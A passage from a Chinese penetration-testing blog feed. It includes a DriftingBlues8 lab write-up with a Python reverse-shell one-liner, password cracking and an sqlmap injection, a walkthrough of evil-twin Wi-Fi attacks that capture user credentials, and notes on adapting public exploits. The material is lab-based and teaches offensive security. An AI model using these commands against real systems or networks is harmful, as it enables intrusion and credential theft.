-&gt;  http://192.168.159.144/vendor/      </span><br><span class="line">[02:42:31] 200 -    7KB - /vendor/                                         </span><br><span class="line">[02:42:31] 301 -  319B  - /config  -&gt;  http://192.168.159.144/config/      </span><br><span class="line">[02:42:31] 200 -    1KB - /config/                                         </span><br><span class="line">[02:42:37] 200 -    1KB - /setup.php                                       </span><br><span class="line">[02:42:43] 301 -  326B  - /Documentation  -&gt;  http://192.168.159.144/Documentation/</span><br><span class="line">[02:42:43] 200 -    4KB - /Documentation/                                   </span><br><span class="line">[02:42:50] 301 -  316B  - /sql  -&gt;  http://192.168.159.144/sql/             </span><br><span class="line">[02:42:50] 200 -    9KB - /sql/                                             </span><br><span class="line">[02:42:58] 200 -   37B  - /controller.php                                   </span><br><span class="line">[02:42:59] 200 -   34KB - /LICENSE                                          </span><br><span class="line">[02:43:01] 301 -  315B  - /ci  -&gt;  http://192.168.159.144/ci/               </span><br><span class="line">[02:43:01] 200 -    2KB - /ci/                                              </span><br><span class="line">[02:43:39] 200 -  938B  - /cloud/                                           </span><br><span class="line">[02:43:39] 301 -  318B  - /cloud  -&gt;  http://192.168.159.144/cloud/         </span><br><span class="line">[02:46:11] 301 -  316B  - /ccr  -&gt;  http://192.168.159.144/ccr/             </span><br><span class="line">[02:46:11] 200 -    4KB - /ccr/</span><br><span class="line">[02:49:29] 301 -  321B  - /patients  -&gt;  http://192.168.159.144/patients/     </span><br><span class="line">[02:49:29] 200 -   28B  - /patients/                                          </span><br><span class="line">[02:52:12] 301 -  325B  - /repositories  -&gt;  http://192.168.159.144/repositories/</span><br><span class="line">[02:52:12] 200 -    2KB - /repositories/                                      </span><br><span class="line">[02:53:24] 301 -  321B  - /myportal  -&gt;  http://192.168.159.144/myportal/     </span><br><span class="line">[02:53:24] 200 -   28B  - /myportal/                                          </span><br><span class="line">[02:57:02] 301 -  321B  - /entities  -&gt;  http://192.168.159.144/entities/     </span><br><span class="line">[02:57:02] 200 -    2KB - /entities/                                          </span><br><span class="line">[02:57:50] 200 -   14KB - /wordlist.txt                                       </span><br><span class="line">[02:58:49] 200 -    3KB - /controllers/                                       </span><br><span class="line">[02:58:49] 301 -  324B  - /controllers  -&gt;  http://192.168.159.144/controllers/</span><br><span class="line">[03:16:06] 403 -  280B  - /server-status/                                     </span><br><span class="line">[03:16:06] 403 -  280B  - /server-status   </span><br></pre></td></tr></table></figure>
<p>访问 admin.php 发现版本是 5.0.1，一会可以到 <a
href="https://www.exploit-db.com/">Exploit Database - Exploits for
Penetration Testers, Researchers, and Ethical Hackers</a>
找找历史漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311657302.png" /></p>
<p>还扫到个字典</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311659261.png" /></p>
<p>试试爆破 admin 用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311659921.png" /></p>
<p>成功拿到密码 <code>admin/.:.yarrak.:.31</code></p>
<p>找找 openEMR CMS 的历史漏洞来尝试反弹 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311703028.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>经测 admin 可直接编辑 config.php ，写个 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311702617.png" /></p>
<p>反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.159.152&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311702618.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311702619.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>找到个 shadow.backup，当前用户有可读权限</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311706365.png" /></p>
<p>利用 scp 传到 kali 尝试破解</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311706366.png" /></p>
<p>clapton 成功破解，得
<code>clapton/dragonsblood</code>，root未成功！</p>
<p>将 shell 切换至 clapton 用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311712616.png" /></p>
<p>clapton 用户下也有个字典，且还有个 waytoroot</p>
<p>尝试执行 waytoroot，结果……hahaha silly hacker!……</p>
<p>将字典传出来用该字典尝试破解下 root 的密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311715324.png" /></p>
<p>成功！得 <code>root/.:.yarak.:.</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311715616.png" /></p>
<p>提权成功!</p>
<h3 id="补充">2.3. 补充</h3>
<p>来源：<a
href="https://linkedroot.wordpress.com/2021/05/02/driftingblues8-hackmyvm/">Driftingblues8
(HackMyVM) – &gt;_linked</a></p>
<p>当前版本还有个 sql 注入漏洞【<a
href="https://www.rapid7.com/db/modules/auxiliary/sqli/openemr/openemr_sqli_dump/">OpenEMR
5.0.1 Patch 6 SQLi Dump</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://192.168.159.144/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1&#x27;</span> -p enc -b --random-agent --batch</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311730022.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>反弹 shell</tag>
        <tag>HackMyVM</tag>
      </tags>
  </entry>
  <entry>
    <title>EVIL TWIN AP or ROGUE AP其他工具</title>
    <url>/2022/06/03/EVIL%20TWIN%20AP%20or%20ROGUE%20AP%20%20%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="ap-欺骗攻击">1. AP 欺骗攻击</h2>
<p><strong>环境</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603182730988-1925046327.png" /></p>
<h3 id="伪造假的ap">1、伪造假的AP</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airbase-ng  --essid zmr -c 11 wlan0mon</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603155632491-118535334.png" /></p>
<h3 id="安装网桥">2、安装网桥</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603152542618-189408732.png" /></p>
<h3 id="添加网桥">3、添加网桥</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brctl addbr bridge-1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603155725434-800778591.png" /></p>
<p><strong>将 at0 和 eth0
网卡添加到网桥，此时这两个网卡工作于混杂模式，所以不需要IP了，因为网桥是工作在链路层的。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~ ]</span><br><span class="line">└─<span class="comment"># ifconfig eth0 0.0.0.0 up</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ifconfig at0 0.0.0.0 up</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># brctl addif bridge-1 eth0 at0</span></span><br></pre></td></tr></table></figure>
<h3 id="为网桥配置-ip-地址">4、为网桥配置 IP 地址</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ifconfig bridge-1 10.10.10.190  netmask 255.255.255.0  up </span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603160533019-822417080.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603160746807-1068594635.png" /></p>
<h3 id="添加网关">5、添加网关</h3>
<p><strong>【主要为给连接假AP的station分配IP地址（DHCP），另外不添加也上不了网】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># route add  -net 0.0.0.0 netmask 0.0.0.0  gw 10.10.10.2</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># netstat -nr</span></span><br><span class="line">    Kernel IP routing table</span><br><span class="line">    Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">    0.0.0.0         10.10.10.2      0.0.0.0         UG        0 0          0 bridge-1</span><br><span class="line">    10.10.10.0      0.0.0.0         255.255.255.0   U         0 0          0 bridge-1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603162616826-2127253691.png" /></p>
<p><strong>注，也可以直接在假AP上安装DHCP来给station分配IP</strong></p>
<h3 id="开启路由转发">6、开启路由转发</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">0</span><br><span class="line"> </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line"> </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /proc/sys/net/ipv4/ip_forward </span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<h3 id="dns欺骗">7、DNS欺骗</h3>
<p><strong>安装dsniff【后面要用到dnsspoof】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install dsniff</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603191618455-2091993451.png" /></strong></p>
<p><strong>指定DNS欺骗的接口</strong>
【经过bridge-1的访问，都会依据hosts的设定发生重定向】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnsspoof -i bridge-1 -f hosts</span><br></pre></td></tr></table></figure>
<p>hosts文件格式可参见：/usr/share/dsniff/dnsspoof.hosts</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603172751411-299511414.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603182957046-468786939.png" /></p>
<h3 id="开启apache2服务">8、开启apache2服务</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603163943908-351466792.png" /></p>
<p><strong>此时连接zmr的设备访问baidu.com，163.com都会被重定向到上图页面</strong></p>
<p><strong>注，个人实验未成功，试了好多次都是无法提供互联网连接（连接zmr-1的设备），但AP可以正常访问
…………</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603190800629-991901975.png" /></strong></p>
<h2 id="viltwinattacker综合工具">2. 3vilTwinAttacker综合工具</h2>
<p>3vilTwinAttacker已经升级为Wifipumpkin3了，
<strong>建议直接安装Wifipumpkin3练习</strong></p>
<h3 id="viltwinattacker-安装">1、3vilTwinAttacker 安装</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/wi-fi-analyzer/3vilTwinAttacker</span><br><span class="line"><span class="built_in">cd</span> 3vilTwinAttacker</span><br><span class="line">sudo <span class="built_in">chmod</span> +x installer.sh</span><br><span class="line">sudo ./installer.sh --install</span><br><span class="line">sudo ./installer.sh --uninstall   <span class="comment">#卸载</span></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607105939369-172600856.jpg" /></p>
<h3 id="可能会出现的报错">2、可能会出现的报错</h3>
<p><strong>（1）ImportError: No module named BeautifulSoup</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110052124-1434700154.jpg" /></p>
<p><strong>解决</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110157914-520390976.jpg" /></p>
<p><strong>（2）TypeError ……</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110250321-292063054.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110319882-1783193882.jpg" /></p>
<p><strong>（3）依赖包自动安装失败的话可以自己单独安装，如</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110505078-2107649225.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607110516664-1892757869.png" /></p>
<p><strong>（4）一个比较特殊的问题，dhcp安装时有几个依赖包没安装成功，在安装其它软件或包时老是失败，这时可以先将dhcp卸载掉，先安装其它的，如</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607111232459-329540279.png" /></p>
<p><strong>（5）特殊环境：Python2 + qt4 + sip</strong></p>
<p><strong>注，</strong>
真心不建议安装3vilTwinAttacker，会遇到各种奇奇怪怪的问题（环境版本导致），心态会崩…………</p>
<h3 id="wifipumpkin3-安装">3、Wifipumpkin3 安装</h3>
<p><strong>方法一（推荐）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install wifipumpkin3</span><br></pre></td></tr></table></figure>
<p><strong>方法二，自己下载包编译安装（也可能会遇到版本不匹配等问题，为此不建议用该方法），具体参见：<a
href="https://wifipumpkin3.github.io/docs/getting-started#installation"
class="uri">https://wifipumpkin3.github.io/docs/getting-started#installation</a></strong></p>
<p><strong>结果</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607112534447-334909328.png" /></p>
<h3 id="wifipumpkin3-使用"><strong>4、Wifipumpkin3 使用</strong></h3>
<p>以下仅简单演示下，详情参见：<a
href="https://wifipumpkin3.github.io/docs/getting-started#usage"
class="uri">https://wifipumpkin3.github.io/docs/getting-started#usage</a></p>
<p><strong>基本用法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wifipumpkin3 -h                 </span></span><br><span class="line">usage: wifipumpkin3 [-h] [-i INTERFACE] [-s SESSION] [-p PULP] [-x XPULP] [-m WIRELESS_MODE] [--no-colors] [--rest]</span><br><span class="line">                    [--restport RESTPORT] [--username USERNAME] [--password PASSWORD] [-v]</span><br><span class="line"></span><br><span class="line">wifipumpkin3 - Powerful framework <span class="keyword">for</span> rogue access point attack. See: https://wifipumpkin3.github.io/docs/getting-</span><br><span class="line">started<span class="comment">#usage</span></span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -i INTERFACE          <span class="built_in">set</span> interface <span class="keyword">for</span> create AP</span><br><span class="line">  -s SESSION            <span class="built_in">set</span> session <span class="keyword">for</span> <span class="built_in">continue</span> attack</span><br><span class="line">  -p PULP, --pulp PULP  interactive sessions can be scripted with .pulp file</span><br><span class="line">  -x XPULP, --xpulp XPULP</span><br><span class="line">                        interactive sessions can be string with <span class="string">&quot;;&quot;</span> as the separator</span><br><span class="line">  -m WIRELESS_MODE, --wireless-mode WIRELESS_MODE</span><br><span class="line">                        <span class="built_in">set</span> wireless mode settings</span><br><span class="line">  --no-colors           <span class="built_in">disable</span> terminal colors and effects.</span><br><span class="line">  --rest                Run the Wp3 RESTful API.</span><br><span class="line">  --restport RESTPORT   Port to run the Wp3 RESTful API on. default is 1337</span><br><span class="line">  --username USERNAME   Start the RESTful API with the specified username instead of pulling from wp3.db</span><br><span class="line">  --password PASSWORD   Start the RESTful API with the specified password instead of pulling from wp3.db</span><br><span class="line">  -v, --version         show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">                                                                                                                               </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/Desktop]</span></span><br><span class="line"><span class="string">└─# wifipumpkin3    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _      ___ _____     ___                  __    _      ____</span></span><br><span class="line"><span class="string"> | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /</span></span><br><span class="line"><span class="string"> | |/ |/ / / _// /___/ ___/ // /  &#x27;</span> \/ _ \/  <span class="string">&#x27;_// / _ \_/_ &lt; </span></span><br><span class="line"><span class="string"> |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/ </span></span><br><span class="line"><span class="string">                                   /_/                       </span></span><br><span class="line"><span class="string">                                            codename: Yorixiriamori</span></span><br><span class="line"><span class="string">by: @mh4x0f - P0cL4bs Team | version: 1.1.2 dev</span></span><br><span class="line"><span class="string">[*] Session id: e35f7c50-e616-11ec-9da9-000c29fd148e </span></span><br><span class="line"><span class="string">Starting prompt...</span></span><br><span class="line"><span class="string">wp3 &gt; help</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Available Commands:</span></span><br><span class="line"><span class="string">=======================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Core Commands:</span></span><br><span class="line"><span class="string">==============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    banner       display an awesome wp3 banner </span></span><br><span class="line"><span class="string">    exit         exit program and all threads</span></span><br><span class="line"><span class="string">    help         show this help </span></span><br><span class="line"><span class="string">    ignore       the message logger will be ignored </span></span><br><span class="line"><span class="string">    info         get information about proxy/plugin settings</span></span><br><span class="line"><span class="string">    kill         terminate a module in background by id</span></span><br><span class="line"><span class="string">    restore      the message logger will be restored </span></span><br><span class="line"><span class="string">    search       search modules by name</span></span><br><span class="line"><span class="string">    set          set variable proxy,plugin and access point </span></span><br><span class="line"><span class="string">    show         show available modules</span></span><br><span class="line"><span class="string">    unset        unset variable commnd hostapd_config</span></span><br><span class="line"><span class="string">    use          select module for modules</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ap Commands:</span></span><br><span class="line"><span class="string">============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    ap           show all variable and status from AP </span></span><br><span class="line"><span class="string">    clients      show all connected clients on AP </span></span><br><span class="line"><span class="string">    dhcpconf     show/choise dhcp server configuration </span></span><br><span class="line"><span class="string">    dhcpmode     show/set all available dhcp server </span></span><br><span class="line"><span class="string">    dump         dump informations from client connected on AP </span></span><br><span class="line"><span class="string">    jobs         show all threads/processes in background </span></span><br><span class="line"><span class="string">    mode         all wireless mode available </span></span><br><span class="line"><span class="string">    start        start access point service</span></span><br><span class="line"><span class="string">    stop         stop access point service</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Commands:</span></span><br><span class="line"><span class="string">=================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    plugins      show all available plugins </span></span><br><span class="line"><span class="string">    proxies      show all available proxies</span></span><br></pre></td></tr></table></figure>
<p>可以用自己编的脚本（指定网卡，ssid等）启动，也可以启动时加上--
xpulp以字符串的形式指定网卡，ssid等，当然也可以在启动后再用set命令设定相关信息，如</p>
<p><strong>wlan0_start.pulp</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># configure the interface</span></span><br><span class="line"><span class="built_in">set</span> interface wlan0 </span><br><span class="line"><span class="comment"># set name of access point will be created</span></span><br><span class="line"><span class="built_in">set</span> ssid z9m8r8</span><br><span class="line"><span class="comment"># set noproxy plguin</span></span><br><span class="line"><span class="built_in">set</span> proxy noproxy</span><br><span class="line"><span class="comment"># ignore all log from pydns_server </span></span><br><span class="line">ignore pydns_server</span><br><span class="line"><span class="comment"># start the Access Point</span></span><br><span class="line">start</span><br></pre></td></tr></table></figure>
<p><strong>伪造AP</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wifipumpkin3 --pulp wlan0_start.pulp</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607114054003-1567069836.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607115217974-1010717217.png" /></p>
<p><strong>或</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wifipumpkin3 --xpulp <span class="string">&quot;set interface wlan0; set ssid z9m8r8; set proxy noproxy; start&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607120120362-1047558196.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607115916408-2135303724.png" /></p>
<p><strong>有 station 连接AP时，会出现下面的情况，当 station
的有登录操作则用户名、密码都可以看到 …</strong>…</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607120254179-1320812579.png" /></p>
<h2 id="wpa-企业钓鱼攻击">3. WPA 企业钓鱼攻击</h2>
<h3 id="安装">1、安装</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># apt-get install hostapd</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/etc/default]</span><br><span class="line">└─<span class="comment"># apt-get install hostapd-wpe</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612092731979-456003736.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612092842029-1669037630.png" /></p>
<h3 id="伪造ap">2、伪造AP</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/etc/hostapd-wpe]</span><br><span class="line">└─<span class="comment"># vim hostapd-wpe.conf  </span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612094735653-754986430.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612094553139-981183934.png" /></p>
<p><strong>当用户连接时会要求输入用户名和密码进行验证，因为时假AP，所以验证不成功，但此时就可以获得challenge和response</strong></p>
<h3 id="asleap破解">3、asleap破解</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612110639472-1825287219.png" /></p>
<p><strong>注，asleap 2.3 破解时会报错（如下），建议使用asleap 2.2
的破解（如上图）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># asleap -C f4:5e:4a:cb:f5:7c:2f:73 -R e8:8d:72:81:36:bf:7d:eb:d5:47:82:bd:cf:1e:24:19:23:a8:45:a7:15:e9:98:49 -W /usr/share/john/password.lst</span></span><br><span class="line">asleap 2.3 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">Using wordlist mode with <span class="string">&quot;/usr/share/john/password.lst&quot;</span>.</span><br><span class="line">Could not recover last 2 bytes of <span class="built_in">hash</span> from the</span><br><span class="line">challenge/response.  Sorry it didn<span class="string">&#x27;t work out.**</span></span><br></pre></td></tr></table></figure>
<p><strong>asleap下载：<a
href="https://http.kali.org/pool/main/a/asleap/"
class="uri">https://http.kali.org/pool/main/a/asleap/</a> 或<a
href="https://github.com/joswr1ght/asleap"
class="uri">https://github.com/joswr1ght/asleap</a></strong></p>
<h3 id="安装方法二">4、安装方法二</h3>
<p><strong>自己编译安装hostapd的教程参见：<a
href="https://warroom.rsmus.com/evil-twin-attack-using-hostapd-wpe/"
class="uri">https://warroom.rsmus.com/evil-twin-attack-using-hostapd-wpe/</a></strong></p>
<p><strong>注，原教程中需安装的依赖包可从下面地址下载</strong></p>
<p><strong>libnl1：<a
href="https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl1_1.1-7_amd64.deb"
class="uri">https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl1_1.1-7_amd64.deb</a></strong></p>
<p><strong>libnl-dev：<a
href="https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl-dev_1.1-7_amd64.deb"
class="uri">https://old-releases.ubuntu.com/ubuntu/pool/universe/libn/libnl/libnl-dev_1.1-7_amd64.deb</a></strong></p>
<p><strong>multiarch-support：<a
href="https://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/multiarch-support_2.19-10ubuntu2.3_amd64.deb"
class="uri">https://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/multiarch-support_2.19-10ubuntu2.3_amd64.deb</a></strong></p>
<p><strong>hostapd：<a href="https://w1.fi/releases/hostapd-2.2.tar.gz"
class="uri">https://w1.fi/releases/hostapd-2.2.tar.gz</a></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>EXP</title>
    <url>/2022/02/05/EXP/</url>
    <content><![CDATA[<h2 id="选择和修改exp">1. 选择和修改EXP</h2>
<p>• 网上公开的 EXP 代码</p>
<p>• 选择可信赖的EXP 源（避免陷阱）</p>
<p>• Exploit-db</p>
<p>• SecurityFocus</p>
<p>• Searchsploit</p>
<p>• 有能力修改 EXP（Python、 Perl、 Ruby、 C、 C++…）</p>
<p>• 646.c</p>
<p>• 类unix环境下编译</p>
<p>• 返回地址与我们的环境不符</p>
<p>• 反弹shell硬编码了回连IP地址</p>
<p>• 缓冲区偏移量与我们的环境不符</p>
<p>• 目标IP硬编码</p>
<p>• 643.c</p>
<p>• Windows环境下编译（即Linux系统上想要编译Windows程序的环境）</p>
<p>• apt-get install mingw32</p>
<p>• dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp;
apt-get install wine32（为Linux系统上.exe的执行提供环境， dpkg
--add-architecture i386让64位机支持32位的架构）</p>
<p>• i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe（编译）</p>
<p>• wine sl.exe 192.168.20.32</p>
<h2 id="避免有害的exp">2. 避免有害的EXP</h2>
<p>• 不同的 EXP</p>
<p>• 不同的系统补丁</p>
<p>• 软件版本</p>
<p>• 不同的offset、 shellcode</p>
<p>• 扫描探测目标系统版本，搭建适当的测试环境</p>
<p>• 避免一锤子测试</p>
<p>• 修改公开的 EXP 满足不同环境需要</p>
<p>• 了解漏洞原理，修改溢出代码</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
      </categories>
      <tags>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>EvilBox: One</title>
    <url>/2024/03/08/EvilBox%20One/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/evilbox-one,736/">EvilBox: One ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
